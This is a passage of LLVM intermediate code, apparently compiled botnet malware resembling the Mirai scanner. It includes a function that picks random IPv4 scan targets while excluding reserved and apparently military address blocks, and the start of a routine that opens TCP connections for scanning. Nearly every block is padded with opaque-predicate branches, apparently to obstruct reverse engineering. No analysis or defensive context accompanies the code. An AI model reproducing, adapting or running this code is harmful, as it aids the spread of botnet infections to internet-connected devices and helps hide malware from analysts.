; <label>:47:                                     ; preds = %originalBBpart2
  %48 = load i8, i8* %2, align 1
  %49 = zext i8 %48 to i32
  %50 = icmp eq i32 %49, 3
  br i1 %50, label %513, label %51

; <label>:51:                                     ; preds = %47
  %52 = load i32, i32* @x.57
  %53 = load i32, i32* @y.58
  %54 = sub i32 %52, 1
  %55 = mul i32 %52, %54
  %56 = urem i32 %55, 2
  %57 = icmp eq i32 %56, 0
  %58 = icmp slt i32 %53, 10
  %59 = or i1 %57, %58
  br i1 %59, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %51
  %60 = load i8, i8* %2, align 1
  %61 = zext i8 %60 to i32
  %62 = icmp eq i32 %61, 15
  %63 = load i32, i32* @x.57
  %64 = load i32, i32* @y.58
  %65 = sub i32 %63, 1
  %66 = mul i32 %63, %65
  %67 = urem i32 %66, 2
  %68 = icmp eq i32 %67, 0
  %69 = icmp slt i32 %64, 10
  %70 = or i1 %68, %69
  br i1 %70, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %62, label %513, label %71

; <label>:71:                                     ; preds = %originalBBpart24
  %72 = load i8, i8* %2, align 1
  %73 = zext i8 %72 to i32
  %74 = icmp eq i32 %73, 16
  br i1 %74, label %513, label %75

; <label>:75:                                     ; preds = %71
  %76 = load i8, i8* %2, align 1
  %77 = zext i8 %76 to i32
  %78 = icmp eq i32 %77, 56
  br i1 %78, label %513, label %79

; <label>:79:                                     ; preds = %75
  %80 = load i8, i8* %2, align 1
  %81 = zext i8 %80 to i32
  %82 = icmp eq i32 %81, 10
  br i1 %82, label %513, label %83

; <label>:83:                                     ; preds = %79
  %84 = load i8, i8* %2, align 1
  %85 = zext i8 %84 to i32
  %86 = icmp eq i32 %85, 192
  br i1 %86, label %87, label %91

; <label>:87:                                     ; preds = %83
  %88 = load i8, i8* %3, align 1
  %89 = zext i8 %88 to i32
  %90 = icmp eq i32 %89, 168
  br i1 %90, label %513, label %91

; <label>:91:                                     ; preds = %87, %83
  %92 = load i8, i8* %2, align 1
  %93 = zext i8 %92 to i32
  %94 = icmp eq i32 %93, 172
  br i1 %94, label %95, label %119

; <label>:95:                                     ; preds = %91
  %96 = load i8, i8* %3, align 1
  %97 = zext i8 %96 to i32
  %98 = icmp sge i32 %97, 16
  br i1 %98, label %99, label %119

; <label>:99:                                     ; preds = %95
  %100 = load i32, i32* @x.57
  %101 = load i32, i32* @y.58
  %102 = sub i32 %100, 1
  %103 = mul i32 %100, %102
  %104 = urem i32 %103, 2
  %105 = icmp eq i32 %104, 0
  %106 = icmp slt i32 %101, 10
  %107 = or i1 %105, %106
  br i1 %107, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %99
  %108 = load i8, i8* %3, align 1
  %109 = zext i8 %108 to i32
  %110 = icmp slt i32 %109, 32
  %111 = load i32, i32* @x.57
  %112 = load i32, i32* @y.58
  %113 = sub i32 %111, 1
  %114 = mul i32 %111, %113
  %115 = urem i32 %114, 2
  %116 = icmp eq i32 %115, 0
  %117 = icmp slt i32 %112, 10
  %118 = or i1 %116, %117
  br i1 %118, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %110, label %513, label %119

; <label>:119:                                    ; preds = %originalBBpart28, %95, %91
  %120 = load i8, i8* %2, align 1
  %121 = zext i8 %120 to i32
  %122 = icmp eq i32 %121, 100
  br i1 %122, label %123, label %163

; <label>:123:                                    ; preds = %119
  %124 = load i32, i32* @x.57
  %125 = load i32, i32* @y.58
  %126 = sub i32 %124, 1
  %127 = mul i32 %124, %126
  %128 = urem i32 %127, 2
  %129 = icmp eq i32 %128, 0
  %130 = icmp slt i32 %125, 10
  %131 = or i1 %129, %130
  br i1 %131, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %123
  %132 = load i8, i8* %3, align 1
  %133 = zext i8 %132 to i32
  %134 = icmp sge i32 %133, 64
  %135 = load i32, i32* @x.57
  %136 = load i32, i32* @y.58
  %137 = sub i32 %135, 1
  %138 = mul i32 %135, %137
  %139 = urem i32 %138, 2
  %140 = icmp eq i32 %139, 0
  %141 = icmp slt i32 %136, 10
  %142 = or i1 %140, %141
  br i1 %142, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %134, label %143, label %163

; <label>:143:                                    ; preds = %originalBBpart212
  %144 = load i32, i32* @x.57
  %145 = load i32, i32* @y.58
  %146 = sub i32 %144, 1
  %147 = mul i32 %144, %146
  %148 = urem i32 %147, 2
  %149 = icmp eq i32 %148, 0
  %150 = icmp slt i32 %145, 10
  %151 = or i1 %149, %150
  br i1 %151, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %143
  %152 = load i8, i8* %3, align 1
  %153 = zext i8 %152 to i32
  %154 = icmp slt i32 %153, 127
  %155 = load i32, i32* @x.57
  %156 = load i32, i32* @y.58
  %157 = sub i32 %155, 1
  %158 = mul i32 %155, %157
  %159 = urem i32 %158, 2
  %160 = icmp eq i32 %159, 0
  %161 = icmp slt i32 %156, 10
  %162 = or i1 %160, %161
  br i1 %162, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %154, label %513, label %163

; <label>:163:                                    ; preds = %originalBBpart216, %originalBBpart212, %119
  %164 = load i8, i8* %2, align 1
  %165 = zext i8 %164 to i32
  %166 = icmp eq i32 %165, 169
  br i1 %166, label %167, label %171

; <label>:167:                                    ; preds = %163
  %168 = load i8, i8* %3, align 1
  %169 = zext i8 %168 to i32
  %170 = icmp sgt i32 %169, 254
  br i1 %170, label %513, label %171

; <label>:171:                                    ; preds = %167, %163
  %172 = load i32, i32* @x.57
  %173 = load i32, i32* @y.58
  %174 = sub i32 %172, 1
  %175 = mul i32 %172, %174
  %176 = urem i32 %175, 2
  %177 = icmp eq i32 %176, 0
  %178 = icmp slt i32 %173, 10
  %179 = or i1 %177, %178
  br i1 %179, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %171
  %180 = load i8, i8* %2, align 1
  %181 = zext i8 %180 to i32
  %182 = icmp eq i32 %181, 198
  %183 = load i32, i32* @x.57
  %184 = load i32, i32* @y.58
  %185 = sub i32 %183, 1
  %186 = mul i32 %183, %185
  %187 = urem i32 %186, 2
  %188 = icmp eq i32 %187, 0
  %189 = icmp slt i32 %184, 10
  %190 = or i1 %188, %189
  br i1 %190, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %182, label %191, label %199

; <label>:191:                                    ; preds = %originalBBpart220
  %192 = load i8, i8* %3, align 1
  %193 = zext i8 %192 to i32
  %194 = icmp sge i32 %193, 18
  br i1 %194, label %195, label %199

; <label>:195:                                    ; preds = %191
  %196 = load i8, i8* %3, align 1
  %197 = zext i8 %196 to i32
  %198 = icmp slt i32 %197, 20
  br i1 %198, label %513, label %199

; <label>:199:                                    ; preds = %195, %191, %originalBBpart220
  %200 = load i8, i8* %2, align 1
  %201 = zext i8 %200 to i32
  %202 = icmp sge i32 %201, 224
  br i1 %202, label %513, label %203

; <label>:203:                                    ; preds = %199
  %204 = load i32, i32* @x.57
  %205 = load i32, i32* @y.58
  %206 = sub i32 %204, 1
  %207 = mul i32 %204, %206
  %208 = urem i32 %207, 2
  %209 = icmp eq i32 %208, 0
  %210 = icmp slt i32 %205, 10
  %211 = or i1 %209, %210
  br i1 %211, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %203
  %212 = load i8, i8* %2, align 1
  %213 = zext i8 %212 to i32
  %214 = icmp eq i32 %213, 106
  %215 = load i32, i32* @x.57
  %216 = load i32, i32* @y.58
  %217 = sub i32 %215, 1
  %218 = mul i32 %215, %217
  %219 = urem i32 %218, 2
  %220 = icmp eq i32 %219, 0
  %221 = icmp slt i32 %216, 10
  %222 = or i1 %220, %221
  br i1 %222, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %214, label %223, label %243

; <label>:223:                                    ; preds = %originalBBpart224
  %224 = load i32, i32* @x.57
  %225 = load i32, i32* @y.58
  %226 = sub i32 %224, 1
  %227 = mul i32 %224, %226
  %228 = urem i32 %227, 2
  %229 = icmp eq i32 %228, 0
  %230 = icmp slt i32 %225, 10
  %231 = or i1 %229, %230
  br i1 %231, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %223
  %232 = load i8, i8* %3, align 1
  %233 = zext i8 %232 to i32
  %234 = icmp eq i32 %233, 186
  %235 = load i32, i32* @x.57
  %236 = load i32, i32* @y.58
  %237 = sub i32 %235, 1
  %238 = mul i32 %235, %237
  %239 = urem i32 %238, 2
  %240 = icmp eq i32 %239, 0
  %241 = icmp slt i32 %236, 10
  %242 = or i1 %240, %241
  br i1 %242, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br i1 %234, label %513, label %243

; <label>:243:                                    ; preds = %originalBBpart228, %originalBBpart224
  %244 = load i8, i8* %2, align 1
  %245 = zext i8 %244 to i32
  %246 = icmp eq i32 %245, 106
  br i1 %246, label %247, label %267

; <label>:247:                                    ; preds = %243
  %248 = load i32, i32* @x.57
  %249 = load i32, i32* @y.58
  %250 = sub i32 %248, 1
  %251 = mul i32 %248, %250
  %252 = urem i32 %251, 2
  %253 = icmp eq i32 %252, 0
  %254 = icmp slt i32 %249, 10
  %255 = or i1 %253, %254
  br i1 %255, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %247
  %256 = load i8, i8* %3, align 1
  %257 = zext i8 %256 to i32
  %258 = icmp eq i32 %257, 187
  %259 = load i32, i32* @x.57
  %260 = load i32, i32* @y.58
  %261 = sub i32 %259, 1
  %262 = mul i32 %259, %261
  %263 = urem i32 %262, 2
  %264 = icmp eq i32 %263, 0
  %265 = icmp slt i32 %260, 10
  %266 = or i1 %264, %265
  br i1 %266, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br i1 %258, label %513, label %267

; <label>:267:                                    ; preds = %originalBBpart232, %243
  %268 = load i32, i32* @x.57
  %269 = load i32, i32* @y.58
  %270 = sub i32 %268, 1
  %271 = mul i32 %268, %270
  %272 = urem i32 %271, 2
  %273 = icmp eq i32 %272, 0
  %274 = icmp slt i32 %269, 10
  %275 = or i1 %273, %274
  br i1 %275, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %267
  %276 = load i8, i8* %2, align 1
  %277 = zext i8 %276 to i32
  %278 = icmp eq i32 %277, 106
  %279 = load i32, i32* @x.57
  %280 = load i32, i32* @y.58
  %281 = sub i32 %279, 1
  %282 = mul i32 %279, %281
  %283 = urem i32 %282, 2
  %284 = icmp eq i32 %283, 0
  %285 = icmp slt i32 %280, 10
  %286 = or i1 %284, %285
  br i1 %286, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br i1 %278, label %287, label %291

; <label>:287:                                    ; preds = %originalBBpart236
  %288 = load i8, i8* %3, align 1
  %289 = zext i8 %288 to i32
  %290 = icmp eq i32 %289, 185
  br i1 %290, label %513, label %291

; <label>:291:                                    ; preds = %287, %originalBBpart236
  %292 = load i32, i32* @x.57
  %293 = load i32, i32* @y.58
  %294 = sub i32 %292, 1
  %295 = mul i32 %292, %294
  %296 = urem i32 %295, 2
  %297 = icmp eq i32 %296, 0
  %298 = icmp slt i32 %293, 10
  %299 = or i1 %297, %298
  br i1 %299, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %291
  %300 = load i8, i8* %2, align 1
  %301 = zext i8 %300 to i32
  %302 = icmp eq i32 %301, 106
  %303 = load i32, i32* @x.57
  %304 = load i32, i32* @y.58
  %305 = sub i32 %303, 1
  %306 = mul i32 %303, %305
  %307 = urem i32 %306, 2
  %308 = icmp eq i32 %307, 0
  %309 = icmp slt i32 %304, 10
  %310 = or i1 %308, %309
  br i1 %310, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br i1 %302, label %311, label %331

; <label>:311:                                    ; preds = %originalBBpart240
  %312 = load i32, i32* @x.57
  %313 = load i32, i32* @y.58
  %314 = sub i32 %312, 1
  %315 = mul i32 %312, %314
  %316 = urem i32 %315, 2
  %317 = icmp eq i32 %316, 0
  %318 = icmp slt i32 %313, 10
  %319 = or i1 %317, %318
  br i1 %319, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %311
  %320 = load i8, i8* %3, align 1
  %321 = zext i8 %320 to i32
  %322 = icmp eq i32 %321, 184
  %323 = load i32, i32* @x.57
  %324 = load i32, i32* @y.58
  %325 = sub i32 %323, 1
  %326 = mul i32 %323, %325
  %327 = urem i32 %326, 2
  %328 = icmp eq i32 %327, 0
  %329 = icmp slt i32 %324, 10
  %330 = or i1 %328, %329
  br i1 %330, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br i1 %322, label %513, label %331

; <label>:331:                                    ; preds = %originalBBpart244, %originalBBpart240
  %332 = load i8, i8* %2, align 1
  %333 = zext i8 %332 to i32
  %334 = icmp eq i32 %333, 150
  br i1 %334, label %335, label %339

; <label>:335:                                    ; preds = %331
  %336 = load i8, i8* %3, align 1
  %337 = zext i8 %336 to i32
  %338 = icmp eq i32 %337, 31
  br i1 %338, label %513, label %339

; <label>:339:                                    ; preds = %335, %331
  %340 = load i8, i8* %2, align 1
  %341 = zext i8 %340 to i32
  %342 = icmp eq i32 %341, 49
  br i1 %342, label %343, label %347

; <label>:343:                                    ; preds = %339
  %344 = load i8, i8* %3, align 1
  %345 = zext i8 %344 to i32
  %346 = icmp eq i32 %345, 51
  br i1 %346, label %513, label %347

; <label>:347:                                    ; preds = %343, %339
  %348 = load i32, i32* @x.57
  %349 = load i32, i32* @y.58
  %350 = sub i32 %348, 1
  %351 = mul i32 %348, %350
  %352 = urem i32 %351, 2
  %353 = icmp eq i32 %352, 0
  %354 = icmp slt i32 %349, 10
  %355 = or i1 %353, %354
  br i1 %355, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %347
  %356 = load i8, i8* %2, align 1
  %357 = zext i8 %356 to i32
  %358 = icmp eq i32 %357, 178
  %359 = load i32, i32* @x.57
  %360 = load i32, i32* @y.58
  %361 = sub i32 %359, 1
  %362 = mul i32 %359, %361
  %363 = urem i32 %362, 2
  %364 = icmp eq i32 %363, 0
  %365 = icmp slt i32 %360, 10
  %366 = or i1 %364, %365
  br i1 %366, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br i1 %358, label %367, label %371

; <label>:367:                                    ; preds = %originalBBpart248
  %368 = load i8, i8* %3, align 1
  %369 = zext i8 %368 to i32
  %370 = icmp eq i32 %369, 62
  br i1 %370, label %513, label %371

; <label>:371:                                    ; preds = %367, %originalBBpart248
  %372 = load i8, i8* %2, align 1
  %373 = zext i8 %372 to i32
  %374 = icmp eq i32 %373, 160
  br i1 %374, label %375, label %395

; <label>:375:                                    ; preds = %371
  %376 = load i32, i32* @x.57
  %377 = load i32, i32* @y.58
  %378 = sub i32 %376, 1
  %379 = mul i32 %376, %378
  %380 = urem i32 %379, 2
  %381 = icmp eq i32 %380, 0
  %382 = icmp slt i32 %377, 10
  %383 = or i1 %381, %382
  br i1 %383, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %375
  %384 = load i8, i8* %3, align 1
  %385 = zext i8 %384 to i32
  %386 = icmp eq i32 %385, 13
  %387 = load i32, i32* @x.57
  %388 = load i32, i32* @y.58
  %389 = sub i32 %387, 1
  %390 = mul i32 %387, %389
  %391 = urem i32 %390, 2
  %392 = icmp eq i32 %391, 0
  %393 = icmp slt i32 %388, 10
  %394 = or i1 %392, %393
  br i1 %394, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br i1 %386, label %513, label %395

; <label>:395:                                    ; preds = %originalBBpart252, %371
  %396 = load i8, i8* %2, align 1
  %397 = zext i8 %396 to i32
  %398 = icmp eq i32 %397, 6
  br i1 %398, label %495, label %399

; <label>:399:                                    ; preds = %395
  %400 = load i8, i8* %2, align 1
  %401 = zext i8 %400 to i32
  %402 = icmp eq i32 %401, 7
  br i1 %402, label %495, label %403

; <label>:403:                                    ; preds = %399
  %404 = load i8, i8* %2, align 1
  %405 = zext i8 %404 to i32
  %406 = icmp eq i32 %405, 11
  br i1 %406, label %495, label %407

; <label>:407:                                    ; preds = %403
  %408 = load i8, i8* %2, align 1
  %409 = zext i8 %408 to i32
  %410 = icmp eq i32 %409, 21
  br i1 %410, label %495, label %411

; <label>:411:                                    ; preds = %407
  %412 = load i8, i8* %2, align 1
  %413 = zext i8 %412 to i32
  %414 = icmp eq i32 %413, 22
  br i1 %414, label %495, label %415

; <label>:415:                                    ; preds = %411
  %416 = load i8, i8* %2, align 1
  %417 = zext i8 %416 to i32
  %418 = icmp eq i32 %417, 26
  br i1 %418, label %495, label %419

; <label>:419:                                    ; preds = %415
  %420 = load i8, i8* %2, align 1
  %421 = zext i8 %420 to i32
  %422 = icmp eq i32 %421, 28
  br i1 %422, label %495, label %423

; <label>:423:                                    ; preds = %419
  %424 = load i32, i32* @x.57
  %425 = load i32, i32* @y.58
  %426 = sub i32 %424, 1
  %427 = mul i32 %424, %426
  %428 = urem i32 %427, 2
  %429 = icmp eq i32 %428, 0
  %430 = icmp slt i32 %425, 10
  %431 = or i1 %429, %430
  br i1 %431, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %423
  %432 = load i8, i8* %2, align 1
  %433 = zext i8 %432 to i32
  %434 = icmp eq i32 %433, 29
  %435 = load i32, i32* @x.57
  %436 = load i32, i32* @y.58
  %437 = sub i32 %435, 1
  %438 = mul i32 %435, %437
  %439 = urem i32 %438, 2
  %440 = icmp eq i32 %439, 0
  %441 = icmp slt i32 %436, 10
  %442 = or i1 %440, %441
  br i1 %442, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  br i1 %434, label %495, label %443

; <label>:443:                                    ; preds = %originalBBpart256
  %444 = load i32, i32* @x.57
  %445 = load i32, i32* @y.58
  %446 = sub i32 %444, 1
  %447 = mul i32 %444, %446
  %448 = urem i32 %447, 2
  %449 = icmp eq i32 %448, 0
  %450 = icmp slt i32 %445, 10
  %451 = or i1 %449, %450
  br i1 %451, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %443
  %452 = load i8, i8* %2, align 1
  %453 = zext i8 %452 to i32
  %454 = icmp eq i32 %453, 30
  %455 = load i32, i32* @x.57
  %456 = load i32, i32* @y.58
  %457 = sub i32 %455, 1
  %458 = mul i32 %455, %457
  %459 = urem i32 %458, 2
  %460 = icmp eq i32 %459, 0
  %461 = icmp slt i32 %456, 10
  %462 = or i1 %460, %461
  br i1 %462, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br i1 %454, label %495, label %463

; <label>:463:                                    ; preds = %originalBBpart260
  %464 = load i8, i8* %2, align 1
  %465 = zext i8 %464 to i32
  %466 = icmp eq i32 %465, 33
  br i1 %466, label %495, label %467

; <label>:467:                                    ; preds = %463
  %468 = load i8, i8* %2, align 1
  %469 = zext i8 %468 to i32
  %470 = icmp eq i32 %469, 55
  br i1 %470, label %495, label %471

; <label>:471:                                    ; preds = %467
  %472 = load i32, i32* @x.57
  %473 = load i32, i32* @y.58
  %474 = sub i32 %472, 1
  %475 = mul i32 %472, %474
  %476 = urem i32 %475, 2
  %477 = icmp eq i32 %476, 0
  %478 = icmp slt i32 %473, 10
  %479 = or i1 %477, %478
  br i1 %479, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %471
  %480 = load i8, i8* %2, align 1
  %481 = zext i8 %480 to i32
  %482 = icmp eq i32 %481, 214
  %483 = load i32, i32* @x.57
  %484 = load i32, i32* @y.58
  %485 = sub i32 %483, 1
  %486 = mul i32 %483, %485
  %487 = urem i32 %486, 2
  %488 = icmp eq i32 %487, 0
  %489 = icmp slt i32 %484, 10
  %490 = or i1 %488, %489
  br i1 %490, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  br i1 %482, label %495, label %491

; <label>:491:                                    ; preds = %originalBBpart264
  %492 = load i8, i8* %2, align 1
  %493 = zext i8 %492 to i32
  %494 = icmp eq i32 %493, 215
  br label %495

; <label>:495:                                    ; preds = %491, %originalBBpart264, %467, %463, %originalBBpart260, %originalBBpart256, %419, %415, %411, %407, %403, %399, %395
  %496 = phi i1 [ true, %originalBBpart264 ], [ true, %467 ], [ true, %463 ], [ true, %originalBBpart260 ], [ true, %originalBBpart256 ], [ true, %419 ], [ true, %415 ], [ true, %411 ], [ true, %407 ], [ true, %403 ], [ true, %399 ], [ true, %395 ], [ %494, %491 ]
  %497 = load i32, i32* @x.57
  %498 = load i32, i32* @y.58
  %499 = sub i32 %497, 1
  %500 = mul i32 %497, %499
  %501 = urem i32 %500, 2
  %502 = icmp eq i32 %501, 0
  %503 = icmp slt i32 %498, 10
  %504 = or i1 %502, %503
  br i1 %504, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %495
  %505 = load i32, i32* @x.57
  %506 = load i32, i32* @y.58
  %507 = sub i32 %505, 1
  %508 = mul i32 %505, %507
  %509 = urem i32 %508, 2
  %510 = icmp eq i32 %509, 0
  %511 = icmp slt i32 %506, 10
  %512 = or i1 %510, %511
  br i1 %512, label %originalBBpart268, label %originalBB66alteredBB

originalBBpart268:                                ; preds = %originalBB66
  br label %513

; <label>:513:                                    ; preds = %originalBBpart268, %originalBBpart252, %367, %343, %335, %originalBBpart244, %287, %originalBBpart232, %originalBBpart228, %199, %195, %167, %originalBBpart216, %originalBBpart28, %87, %79, %75, %71, %originalBBpart24, %47, %originalBBpart2, %23
  %514 = phi i1 [ true, %originalBBpart252 ], [ true, %367 ], [ true, %343 ], [ true, %335 ], [ true, %originalBBpart244 ], [ true, %287 ], [ true, %originalBBpart232 ], [ true, %originalBBpart228 ], [ true, %199 ], [ true, %195 ], [ true, %167 ], [ true, %originalBBpart216 ], [ true, %originalBBpart28 ], [ true, %87 ], [ true, %79 ], [ true, %75 ], [ true, %71 ], [ true, %originalBBpart24 ], [ true, %47 ], [ true, %originalBBpart2 ], [ true, %23 ], [ %496, %originalBBpart268 ]
  %515 = load i32, i32* @x.57
  %516 = load i32, i32* @y.58
  %517 = sub i32 %515, 1
  %518 = mul i32 %515, %517
  %519 = urem i32 %518, 2
  %520 = icmp eq i32 %519, 0
  %521 = icmp slt i32 %516, 10
  %522 = or i1 %520, %521
  br i1 %522, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %513
  %523 = load i32, i32* @x.57
  %524 = load i32, i32* @y.58
  %525 = sub i32 %523, 1
  %526 = mul i32 %523, %525
  %527 = urem i32 %526, 2
  %528 = icmp eq i32 %527, 0
  %529 = icmp slt i32 %524, 10
  %530 = or i1 %528, %529
  br i1 %530, label %originalBBpart272, label %originalBB70alteredBB

originalBBpart272:                                ; preds = %originalBB70
  br i1 %514, label %6, label %531

; <label>:531:                                    ; preds = %originalBBpart272
  %532 = load i8, i8* %2, align 1
  %533 = zext i8 %532 to i32
  %534 = shl i32 %533, 24
  %535 = load i8, i8* %3, align 1
  %536 = zext i8 %535 to i32
  %537 = shl i32 %536, 16
  %538 = or i32 %534, %537
  %539 = load i8, i8* %4, align 1
  %540 = zext i8 %539 to i32
  %541 = shl i32 %540, 8
  %542 = or i32 %538, %541
  %543 = load i8, i8* %5, align 1
  %544 = zext i8 %543 to i32
  %545 = shl i32 %544, 0
  %546 = or i32 %542, %545
  %547 = call i32 @htonl(i32 %546) #7
  ret i32 %547

originalBBalteredBB:                              ; preds = %originalBB, %27
  %548 = load i8, i8* %2, align 1
  %549 = zext i8 %548 to i32
  %550 = icmp eq i32 %549, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %51
  %551 = load i8, i8* %2, align 1
  %552 = zext i8 %551 to i32
  %553 = icmp eq i32 %552, 15
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %99
  %554 = load i8, i8* %3, align 1
  %555 = zext i8 %554 to i32
  %556 = icmp slt i32 %555, 32
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %123
  %557 = load i8, i8* %3, align 1
  %558 = zext i8 %557 to i32
  %559 = icmp sge i32 %558, 64
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %143
  %560 = load i8, i8* %3, align 1
  %561 = zext i8 %560 to i32
  %562 = icmp slt i32 %561, 127
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %171
  %563 = load i8, i8* %2, align 1
  %564 = zext i8 %563 to i32
  %565 = icmp eq i32 %564, 198
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %203
  %566 = load i8, i8* %2, align 1
  %567 = zext i8 %566 to i32
  %568 = icmp eq i32 %567, 106
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %223
  %569 = load i8, i8* %3, align 1
  %570 = zext i8 %569 to i32
  %571 = icmp eq i32 %570, 186
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %247
  %572 = load i8, i8* %3, align 1
  %573 = zext i8 %572 to i32
  %574 = icmp eq i32 %573, 187
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %267
  %575 = load i8, i8* %2, align 1
  %576 = zext i8 %575 to i32
  %577 = icmp eq i32 %576, 106
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %291
  %578 = load i8, i8* %2, align 1
  %579 = zext i8 %578 to i32
  %580 = icmp eq i32 %579, 106
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %311
  %581 = load i8, i8* %3, align 1
  %582 = zext i8 %581 to i32
  %583 = icmp eq i32 %582, 184
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %347
  %584 = load i8, i8* %2, align 1
  %585 = zext i8 %584 to i32
  %586 = icmp eq i32 %585, 178
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %375
  %587 = load i8, i8* %3, align 1
  %588 = zext i8 %587 to i32
  %589 = icmp eq i32 %588, 13
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %423
  %590 = load i8, i8* %2, align 1
  %591 = zext i8 %590 to i32
  %592 = icmp eq i32 %591, 29
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %443
  %593 = load i8, i8* %2, align 1
  %594 = zext i8 %593 to i32
  %595 = icmp eq i32 %594, 30
  br label %originalBB58

originalBB62alteredBB:                            ; preds = %originalBB62, %471
  %596 = load i8, i8* %2, align 1
  %597 = zext i8 %596 to i32
  %598 = icmp eq i32 %597, 214
  br label %originalBB62

originalBB66alteredBB:                            ; preds = %originalBB66, %495
  br label %originalBB66

originalBB70alteredBB:                            ; preds = %originalBB70, %513
  br label %originalBB70
}

; Function Attrs: noinline nounwind uwtable
define internal void @setup_connection(%struct.scanner_connection*) #0 {
  %2 = alloca %struct.scanner_connection*, align 8
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store %struct.scanner_connection* %0, %struct.scanner_connection** %2, align 8
  %5 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %5, i8 0, i64 16, i32 4, i1 false)
  %6 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %7 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %6, i32 0, i32 1
  %8 = load i32, i32* %7, align 8
  %9 = icmp ne i32 %8, -1
  br i1 %9, label %10, label %15

; <label>:10:                                     ; preds = %1
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 1
  %13 = load i32, i32* %12, align 8
  %14 = call i32 @close(i32 %13)
  br label %15

; <label>:15:                                     ; preds = %10, %1
  %16 = call i32 @socket(i32 2, i32 1, i32 0) #6
  %17 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %18 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %17, i32 0, i32 1
  store i32 %16, i32* %18, align 8
  %19 = icmp eq i32 %16, -1
  br i1 %19, label %20, label %21

; <label>:20:                                     ; preds = %15
  br label %75

; <label>:21:                                     ; preds = %15
  %22 = load i32, i32* @x.59
  %23 = load i32, i32* @y.60
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %21
  %30 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %31 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %30, i32 0, i32 6
  store i32 0, i32* %31, align 4
  %32 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
